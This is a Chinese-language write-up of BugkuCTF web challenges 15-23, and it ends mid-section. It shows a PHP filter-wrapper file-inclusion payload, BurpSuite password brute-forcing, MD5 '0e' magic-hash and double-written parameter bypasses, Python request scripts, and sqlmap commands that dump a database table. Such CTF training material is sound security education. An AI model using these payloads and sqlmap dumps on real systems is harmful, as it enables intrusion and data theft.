<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function checkSubmit()&#123;</span><br><span class="line">    var a&#x3D;document.getElementById(&quot;password&quot;);</span><br><span class="line">    if(&quot;undefined&quot;!&#x3D;typeof a)&#123;</span><br><span class="line">        if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;&#x3D;&#x3D;a.value)</span><br><span class="line">            return!0;</span><br><span class="line">        alert(&quot;Error&quot;);</span><br><span class="line">        a.focus();</span><br><span class="line">        return!1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&quot;levelQuest&quot;).onsubmit&#x3D;checkSubmit;</span><br></pre></td></tr></table></figure>

<p>提交字符串”67d709b2b54aa2aa648cf6e87a7114f1”即可获得flag</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180718164146665.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;J22JK-HS11&#125;</span><br></pre></td></tr></table></figure>



<p><strong>16. flag在index里</strong></p>
<p>考点：php伪协议 </p>
<p>Topic Link：<a href="http://123.206.87.240:8005/post/" target="_blank" rel="noopener">http://123.206.87.240:8005/post/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216133846068-2129439841.png" alt="img"></p>
<p>知识简介：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">php伪协议：</span><br><span class="line">        file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">        http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">        ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">        php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">        zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">        data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">        glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">        phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">        ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">        rar:&#x2F;&#x2F; — RAR</span><br><span class="line">        ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">        expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>

<p>点击按钮：click me? no </p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216134127832-578489293.png" alt="img"></p>
<p>进入test5界面</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216134238535-1016649346.png" alt="img"></p>
<p>分析<br>?file=show.php<br>测试是否存在文件包含漏洞<br>利用php伪协议进行测试<br>根据题目提示：flag在index里<br>尝试payload：?file=php://filter/convert.base64-encode/resource=index.php<br>获取index.php经过base64加密的源码，对其进行解密：</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216134357144-375036317.png" alt="img"></p>
<p>在源码中 get flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span><br></pre></td></tr></table></figure>



<p><strong>17. 输入密码查看flag</strong></p>
<p>考点：字典爆破 </p>
<p>Topic Link：<a href="http://123.206.87.240:8002/baopo/" target="_blank" rel="noopener">http://123.206.87.240:8002/baopo/</a></p>
<p> <img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216155444176-798125700.png" alt="img"></p>
<p>利用BurpSuite进行爆破密码</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216160941733-73698644.png" alt="img"></p>
<p>获取爆破对象</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216161144710-447579115.png" alt="img"></p>
<p>获取爆破字典</p>
<p> <img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216161413060-441984988.png" alt="img"></p>
<p>根据Length获取密码: 13579</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216161304578-1398472216.png" alt="img"></p>
<p> 输入pwd：13579</p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bugku-baopo-hah&#125;</span><br></pre></td></tr></table></figure>





<p><strong>18. 点击一百万次</strong></p>
<p>考点：代码审计 </p>
<p>Topic Link：<a href="http://123.206.87.240:9001/test/" target="_blank" rel="noopener">http://123.206.87.240:9001/test/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216161740822-797324921.png" alt="img"></p>
<p> 根据页面显示需要点击曲奇1000000次才能够得到flag，是不是感觉很好玩 <em>-</em></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216162017982-762759123.png" alt="img"></p>
<p>查看源码，分析<script>代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  var clicks&#x3D;0</span><br><span class="line">  $(function() &#123;</span><br><span class="line">    $(&quot;#cookie&quot;)</span><br><span class="line">      .mousedown(function() &#123;</span><br><span class="line">        $(this).width(&#39;350px&#39;).height(&#39;350px&#39;);</span><br><span class="line">      &#125;)</span><br><span class="line">      .mouseup(function() &#123;</span><br><span class="line">        $(this).width(&#39;375px&#39;).height(&#39;375px&#39;);</span><br><span class="line">        clicks++;</span><br><span class="line">        $(&quot;#clickcount&quot;).text(clicks);</span><br><span class="line">        if(clicks &gt;&#x3D; 1000000)&#123;</span><br><span class="line">            var form &#x3D; $(&#39;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&#39; +</span><br><span class="line">                      &#39;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;clicks&quot; value&#x3D;&quot;&#39; + clicks + &#39;&quot; hidden&#x2F;&gt;&#39; +</span><br><span class="line">                      &#39;&lt;&#x2F;form&gt;&#39;);</span><br><span class="line">                      $(&#39;body&#39;).append(form);</span><br><span class="line">                      form.submit();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>通过POST传递数据对clicks赋值大于1000000就可以得到flag，是不是比鼠标点击快好多了，哈哈哈哈哈</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216162619161-436279488.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Not_C00kI3Cl1ck3r&#125;</span><br></pre></td></tr></table></figure>



<p><strong>19. 备份是个好习惯</strong></p>
<p><strong>知识简介</strong></p>
<p>strstr()函数语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strstr — 查找字符串的首次出现</span><br><span class="line"></span><br><span class="line">string strstr( string $haystack, mixed $needle[, bool $before_needle &#x3D; FALSE] )</span><br><span class="line"></span><br><span class="line">返回 haystack 字符串从 needle 第一次出现的位置开始到 haystack 结尾的字符串。</span><br></pre></td></tr></table></figure>

<p>substr()函数语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">substr — 返回字符串的子串</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string substr( string $string, int $start[, int $length] )</span><br><span class="line"></span><br><span class="line">返回字符串 string 由 start 和 length 参数指定的子字符串。 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参数 </span><br><span class="line"></span><br><span class="line">string</span><br><span class="line">输入字符串。必须至少有一个字符。 </span><br><span class="line">start</span><br><span class="line">如果 start 是非负数，返回的字符串将从 string 的 start 位置开始，从 0 开始计算。例如，在字符串 &quot;abcdef&quot; 中，在位置 0 的字符是 &quot;a&quot;，位置 2 的字符串是 &quot;c&quot; 等等。 </span><br><span class="line">如果 start 是负数，返回的字符串将从 string 结尾处向前数第 start 个字符开始。 </span><br><span class="line">如果 string 的长度小于 start，将返回 FALSE。 </span><br><span class="line"></span><br><span class="line">length</span><br><span class="line">如果提供了正数的 length，返回的字符串将从 start 处开始最多包括 length 个字符（取决于 string 的长度）。</span><br><span class="line">如果提供了负数的 length，那么 string 末尾处的 length 个字符将会被省略（若 start 是负数则从字符串尾部算起）。如果 start 不在这段文本中，那么将返回 FALSE。</span><br><span class="line">如果提供了值为 0，FALSE 或 NULL 的 length，那么将返回一个空字符串。</span><br><span class="line">如果没有提供 length，返回的子字符串将从 start 位置开始直到字符串结尾。 </span><br><span class="line"></span><br><span class="line">返回值 </span><br><span class="line"></span><br><span class="line">返回提取的子字符串， 或者在失败时返回 FALSE。</span><br></pre></td></tr></table></figure>

<p>str_replace()函数语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">str_replace — 子字符串替换</span><br><span class="line"></span><br><span class="line">mixed str_replace( mixed $search, mixed $replace, mixed $subject[, int &amp;$count] )</span><br><span class="line"></span><br><span class="line">该函数返回一个字符串或者数组。该字符串或数组是将 subject 中全部的 search 都被 replace 替换之后的结果。 </span><br><span class="line"></span><br><span class="line">如果没有一些特殊的替换需求（比如正则表达式），你应该使用该函数替换 ereg_replace() 和 preg_replace()。 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参数 </span><br><span class="line"></span><br><span class="line">如果 search 和 replace 为数组，那么 str_replace() 将对 subject 做二者的映射替换。如果 replace 的值的个数少于 search 的个数，多余的替换将使用空字符串来进行。如果 search 是一个数组而 replace 是一个字符串，那么 search 中每个元素的替换将始终使用这个字符串。该转换不会改变大小写。 </span><br><span class="line">如果 search 和 replace 都是数组，它们的值将会被依次处理。 </span><br><span class="line"></span><br><span class="line">search</span><br><span class="line">查找的目标值，也就是 needle。一个数组可以指定多个目标。 </span><br><span class="line">replace</span><br><span class="line">search 的替换值。一个数组可以被用来指定多重替换。 </span><br><span class="line">subject</span><br><span class="line">执行替换的数组或者字符串。也就是 haystack。 </span><br><span class="line"></span><br><span class="line">如果 subject 是一个数组，替换操作将遍历整个 subject，返回值也将是一个数组。 </span><br><span class="line">count</span><br><span class="line">如果被指定，它的值将被设置为替换发生的次数。 </span><br><span class="line"></span><br><span class="line">返回值 </span><br><span class="line"></span><br><span class="line">该函数返回替换后的数组或者字符串。</span><br></pre></td></tr></table></figure>

<p>parse_str()函数语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">parse_str — 将字符串解析成多个变量</span><br><span class="line"></span><br><span class="line">void parse_str( string $encoded_string[, array &amp;$result] )</span><br><span class="line"></span><br><span class="line">如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。 </span><br><span class="line"></span><br><span class="line">参数 </span><br><span class="line"></span><br><span class="line">encoded_string</span><br><span class="line">输入的字符串。 </span><br><span class="line">result</span><br><span class="line">如果设置了第二个变量 result，变量将会以数组元素的形式存入到这个数组，作为替代。 </span><br><span class="line"></span><br><span class="line">返回值 </span><br><span class="line"></span><br><span class="line">没有返回值。</span><br></pre></td></tr></table></figure>

<p>md5函数语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">md5 — 计算字符串的 MD5 散列值</span><br><span class="line"></span><br><span class="line">string md5( string $str[, bool $raw_output &#x3D; false] )</span><br><span class="line"></span><br><span class="line">参数 </span><br><span class="line"></span><br><span class="line">str</span><br><span class="line">原始字符串。 </span><br><span class="line">raw_output</span><br><span class="line">如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。 </span><br><span class="line"></span><br><span class="line">返回值 </span><br><span class="line"></span><br><span class="line">以 32 字符十六进制数字形式返回散列值。</span><br></pre></td></tr></table></figure>



<p><strong>题目信息</strong></p>
<p>考点：代码审计、MD5</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web16/" target="_blank" rel="noopener">http://123.206.87.240:8002/web16/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216162831395-962540966.png" alt="img"></p>
<p> 利用御剑扫描工具对网站进行扫描得到一个.bak文件</p>
<p> <img src="BugkuCTF~Web~WriteUp/1594459-20190216162942996-415014647.png" alt="img"></p>
<p>读取.bak文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017&#x2F;8&#x2F;6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;);</span><br><span class="line">$str &#x3D; substr($str,1);</span><br><span class="line">$str &#x3D; str_replace(&#39;key&#39;,&#39;&#39;,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123;</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计发现需要满足几个条件：1. GET方法进行传递数据 </p>
<ol start="2">
<li><p>传递的数据里面需要有两个变量key1和key2</p>
<p>key1) == md5($key2) && $key1 !== $key2) ==》 TRUE</p>
</li>
</ol>
<p>漏洞利用：1. 用双写key来绕过str_repalce()函数</p>
<p>   　　　　　2. 利用MD5的特殊字符串绕过if(md5($key1) == md5($key2) && $key1 !== $key2)条件</p>
<p>MD5特殊字符串：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web16&#x2F;index.php?kekeyy1&#x3D;s878926199a&amp;kekeyy2&#x3D;QNKCDZO</span><br></pre></td></tr></table></figure>

<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bugku&#123;OH_YOU_FIND_MY_MOMY&#125;</span><br></pre></td></tr></table></figure>



<p><strong>20. 成绩单</strong></p>
<p>考点：SQL注入</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/chengjidan/" target="_blank" rel="noopener">http://123.206.87.240:8002/chengjidan/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216170356047-1405904337.png" alt="img"></p>
<p>查看界面，进行测试，发现网页通过POST传递ID值来进行改变网页显示内容</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216170755961-287757138.png" alt="img"></p>
<p>分析可能存在SQL注入漏洞，利用sqlmap进行测试</p>
<p>测试代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u&quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;chengjidan&#x2F;index.php&quot; --dbs --data&#x3D;&quot;id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216170929779-782265244.png" alt="img"></p>
<p>测试结果，存在SQL注入漏洞，爆出来了数据库</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216171103063-1743822362.png" alt="img"></p>
<p>报表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u&quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;chengjidan&#x2F;index.php&quot; --dbs --data&#x3D;&quot;id&#x3D;1&quot; -D skctf_flag --tables</span><br></pre></td></tr></table></figure>

<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216171403137-1702779381.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216171451662-727140334.png" alt="img"></p>
<p>爆字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u&quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;chengjidan&#x2F;index.php&quot; --dbs --data&#x3D;&quot;id&#x3D;1&quot; -D skctf_flag -T fl4g --columns</span><br></pre></td></tr></table></figure>

<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216172020487-1577811046.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216172107184-49313849.png" alt="img"></p>
<p>爆特定字段值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u&quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;chengjidan&#x2F;index.php&quot; --dbs --data&#x3D;&quot;id&#x3D;1&quot; -D skctf_flag -T fl4g -C skctf_flag --dump</span><br></pre></td></tr></table></figure>

<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216172253604-1063045744.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216172337775-506174789.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BUGKU&#123;Sql_INJECT0N_4813drd8hz4&#125;</span><br></pre></td></tr></table></figure>



<p><strong>21. 秋名山老司机</strong></p>
<p>考点：脚本编写</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/qiumingshan/[" target="_blank" rel="noopener">http://123.206.87.240:8002/qiumingshan/[</a></p>
<p>](<a href="http://123.206.87.240:8002/chengjidan/" target="_blank" rel="noopener">http://123.206.87.240:8002/chengjidan/</a>)</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190331173651553-398703496.png" alt="img"></p>
<p>根据页面显示，让2s内计算一个公式，口算你认为你可能吗？？？，编写Python脚本。</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190331173810921-912603646.png" alt="img"></p>
<p>但是不知道使用脚本计算出来的结果该怎么处理。出题人可真是老司机！！！！，当页面刷新超过2次时，就会显示不同的页面，提示怎么处理你计算出的结果。</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190331174340008-652051601.png" alt="img"></p>
<p>python脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;qiumingshan&#x2F;&#39;</span><br><span class="line">R &#x3D; requests.session()</span><br><span class="line">g &#x3D; R.get(url)</span><br><span class="line">page &#x3D; re.findall(r&#39;&lt;div&gt;(.*)&#x3D;\?;&lt;&#x2F;div&gt;&#39;, g.text)[0]</span><br><span class="line">result &#x3D; eval(page)</span><br><span class="line">data &#x3D; &#123;&#39;value&#39;: result&#125;</span><br><span class="line">flag &#x3D; R.post(url, data&#x3D;data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>

<p><img src="BugkuCTF~Web~WriteUp/1594459-20190331174645359-4423448.png" alt="img"></p>
<p>脚本的运行需要超过两次，才能够得到flag <em>_</em></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bugku&#123;YOU_DID_IT_BY_SECOND&#125;</span><br></pre></td></tr></table></figure>



<p><strong>22. 速度要快</strong></p>
<p>考点：脚本编写</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web6/" target="_blank" rel="noopener">http://123.206.87.240:8002/web6/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190401065849346-2104919869.png" alt="img"></p>
<p>查看页面源代码</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190401065954368-1374831851.png" alt="img"></p>
<p>根据提示需要POST传递一个margin，但是不知道margin的值是什么，于是抓取一个数据包进行查看</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190401070233804-754749849.png" alt="img"></p>
<p>发现响应报文里面出现flag，先将其base64解码查看</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190401070409305-984465291.png" alt="img"></p>
<p>难道这就是flag?????</p>
<p>通过提交该值，发现并不是(肯定不会这么简单。。。。)，根据源码里面的提示margin的值为你发现的东西，猜想margin的值就是flag，当我再次向服务器发出请求时发现flag的值在变化。</p>
<p>现在只有编写脚本  #一定要保证整个操作是在一个session中不然每一次的请求flag的值都不一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web6&#x2F;&#39;</span><br><span class="line">#使用同一个会话</span><br><span class="line">r &#x3D; requests.session()</span><br><span class="line">#get方式无参请求</span><br><span class="line">get_response &#x3D; r.get(url)</span><br><span class="line">#bytes.decode(&quot;value&quot;)方法将byte类型的数据转换成str类型的数据</span><br><span class="line">key &#x3D; base64.b64decode(bytes.decode(base64.b64decode(get_response.headers[&#39;flag&#39;])).split(&quot;:&quot;)[1])</span><br><span class="line">#post：flag</span><br><span class="line">post &#x3D; &#123;&#39;margin&#39;: key&#125;</span><br><span class="line">post_responese &#x3D; r.post(url, data&#x3D;post)</span><br><span class="line">#获取页面内容,使用&quot;value&quot;.decode()方法将byte类型的数据转换成str类型的数据,两种引用方式不一样,但效果一样</span><br><span class="line">print(post_responese.content.decode())</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190401071043168-1401740064.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;111dd62fcd377076be18a&#125;</span><br></pre></td></tr></table></figure>



<p><strong>23. cookies欺骗</strong></p>
<p>考点：Cookie、base64编码</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web11/答案格式：KEY{xxxxxxxx}" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/</a>  <a href="http://123.206.87.240:8002/web11/答案格式：KEY{xxxxxxxx}" target="_blank" rel="noopener">答案格式：KEY{xxxxxxxx}</a></p>
<p> <img src="BugkuCTF~Web~WriteUp/1594459-20190519211326429-2046837809.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190519211514450-694029823.png" alt="img"></p>
<p>filename为base64编码，由此读取index.php文件，但是有行数的限制，编写脚本读取index.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">a&#x3D;50</span><br><span class="line">for i in range(a):</span><br><span class="line">    url&#x3D;&quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&quot;+str(i)+&quot;&amp;filename&#x3D;aW5kZXgucGhw&quot;</span><br><span class="line">    s&#x3D;requests.get(url)</span><br><span class="line">    print (s.text)</span><br></pre></td></tr></table></figure>

<p>Result</p>
